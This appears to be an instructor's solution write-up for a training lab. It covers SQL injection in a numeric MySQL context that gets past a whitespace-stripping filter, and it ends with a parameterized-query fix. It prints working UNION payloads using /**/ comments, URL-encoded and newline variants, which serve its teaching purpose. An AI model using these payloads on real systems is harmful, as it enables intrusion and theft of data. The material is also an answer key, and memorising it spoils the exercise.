# Solution — sqli-waf-bypass-whitespace-tabs

<!-- Instructor/authoring reference. Students should try the hints first. -->

> **Design note (deviation from the bare catalog spec).** The catalog phrases the
> backend query as `SELECT username,email FROM users WHERE id=<id>`. This
> implementation adds a single leading predicate — `WHERE is_admin=0 AND id=<id>`
> — so that an _honest_ `/lookup?id=1` returns nothing and the admin email is
> genuinely hidden. Without it the lab would be trivial (just request id 1) and
> the whitespace filter would teach nothing. The predicate sits _before_ the
> injected value, so the intended UNION payload needs no trailing comment: the
> injected `... UNION SELECT ... WHERE id=1` is a complete second statement and
> nothing dangles after it. Everything else matches the spec: MySQL 8.4, a numeric
> injection context, a per-container admin email, and `/solve?email=`.
>
> **Architecture note (simplification).** Like the other Python SQLi labs, this
> one omits any reverse proxy: gunicorn binds `0.0.0.0:8080` directly and the
> container publishes that port on `127.0.0.1`. A proxy is a transport detail; it
> would forward the same `id` query parameter to the same Flask handler, so
> removing it changes nothing about the vulnerability, the filter, or the fix. The
> vulnerable stack is app + a hardened non-root MySQL.

## What tipped you off

`/lookup?id=2` returns Alice; `?id=3` returns Bob — the value clearly reaches
SQL. `?id=1` returns _nothing_, even though a directory obviously has an admin:
the row is being filtered out server-side, not missing. And this is a **numeric**
context (`id=<id>`), so there is no quote to escape — the challenge is not
breaking _out_ of a string, it is getting SQL _keywords_ past the filter.

Feed `/lookup` a normal injection like `id=1 UNION SELECT username,email FROM
users WHERE id=1` and it fails. Send the same thing to `/debug?id=...` and the
oracle shows you why:

```
forwarded-to-backend: '1UNIONSELECTusername,emailFROMusersWHEREid=1'
contains-0x20-space: False
```

Every space is gone — `1UNIONSELECT...` is not valid SQL. The filter did exactly
what it was built to do. It just solved the wrong problem.

## The class of bug

SQL injection (**CWE-89**, OWASP **A03:2021 – Injection**) in a **numeric**
context, reached by defeating a **whitespace blacklist**. The developer confused
"contains no spaces" with "contains no SQL". Stripping `0x20`/`0x09` (and the
`+`, `%20`, `%09` that decode to them) removes _one_ family of token separators
while leaving several others untouched — and it never parameterizes anything, so
the moment a separator survives, the input is code again.

## The filter, and its gap

`src/app.py`, `waf_forward`:

```python
s = s.replace("+", "")                       # drop '+'
s = _WS_ESCAPES.sub(...)                      # %20 -> ' ', %09 -> '\t'
s = s.replace(" ", "").replace("\t", "")      # strip spaces and tabs
return urllib.parse.unquote(s)                # decode the rest, forward it
```

`_WS_ESCAPES` only matches `%20` and `%09`. It never touches:

- **`/**/`** — a MySQL inline comment. Anywhere a space is legal, `/**/` is too,
  and it contains no whitespace bytes at all.
- **`%0a`** (newline, `0x0a`) and `%0d` (carriage return) — real whitespace to
  the SQL tokenizer, but the filter's list stops at `%20`/`%09`, so the final
  `unquote` turns `%0a` into a live newline and forwards it.
- **parentheses** — `id=(1)UNION(SELECT...)` needs far fewer separators to begin
  with.

Because the value is concatenated (never bound), any one of these turns the
forwarded bytes back into executable SQL.

## Why the developer wrote it this way

Blacklisting "looks" defensive and ships in an afternoon: no query rewrite, no
parameter binding, no touching the data layer — just scrub the input on the way
in. It even passes a quick test, because the textbook payloads the author copied
from a blog post are full of spaces. What the author never internalised is that a
filter has to enumerate _every_ way the target grammar separates tokens, forever,
while the attacker needs to find only _one_ the list missed. That is an
unwinnable asymmetry, which is exactly why input sanitisation is the wrong layer
for this problem.

## The mechanical exploit

1. **Confirm the context.** `?id=2` works, `?id=1` is hidden, `?id=abc` errors —
   numeric injection, admin filtered by `is_admin=0`.
2. **See what survives.** `/debug?id=1%20UNION%20SELECT%201` → the oracle shows
   `1UNIONSELECT1` and `contains-0x20-space: False`. Spaces are stripped;
   keywords fuse; the query breaks.
3. **Substitute the separators.** Replace every space with `/**/` (or `%0a`):

   ```
   /lookup?id=0/**/UNION/**/SELECT/**/username,email/**/FROM/**/users/**/WHERE/**/id=1
   ```

   `/debug` on the same value now shows the forwarded bytes with `/**/` intact and
   still zero spaces. Because the value is numeric, no quote is needed.

## Exploit walkthrough

URL-encode the payload so `/`, `*`, `,` and `=` travel as escapes; the filter's
final `unquote` restores them and no literal space is ever sent:

```
GET /lookup?id=0%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fusername%2Cemail%2F%2A%2A%2FFROM%2F%2A%2A%2Fusers%2F%2A%2A%2FWHERE%2F%2A%2A%2Fid%3D1
-> ... <li>admin &mdash; admin-<16 hex>@lab.internal</li> ...
```

The backend runs, in effect:

```sql
SELECT username, email FROM users
WHERE is_admin=0 AND id=0 UNION SELECT username,email FROM users WHERE id=1
```

`is_admin=0 AND id=0` matches nothing; the UNIONed second `SELECT` reads the
hidden admin row (`id=1`) into the result set, where its random email is rendered.
Scrape it, then trade it for the flag:

```
GET /solve?email=admin-<16 hex>@lab.internal   ->   200  FLAG{...}
```

`tests/exploit.py` performs exactly this with the standard library only: it first
hits `/debug` to assert the payload is space-free, extracts the admin email
dynamically (it is random per container), submits it to `/solve`, and asserts the
recovered flag equals the HMAC-derived expected value. A newline variant
(`id=0%0aUNION%0aSELECT%0ausername,email%0aFROM%0ausers%0aWHERE%0aid=1`) reaches
the identical result and is a good exercise.

## Fix

Stop trying to sanitise separators; bind the value and let it be a number:

```python
sql = "SELECT username, email FROM users WHERE is_admin=0 AND id=%s"
try:
    with conn.cursor() as cur:
        cur.execute(sql, (int(request.args["id"]),))   # a value, never code
        rows = cur.fetchall()
except (ValueError, KeyError):
    return Response("Badge id must be a number.", status=400)
```

Two independent controls, either of which closes the hole: **parameterize** so
`UNION`, `/**/`, and newlines are compared literally against `id` and match
nothing; and **validate the type** (`int(...)`) so a numeric field only ever
accepts digits. Delete the whitespace filter entirely — a blacklist that must
anticipate every token separator MySQL will ever accept is a maintenance trap, not
a boundary. If access to the admin row must be restricted, enforce that with
authorization on the row, not by hoping an attacker never reads it.
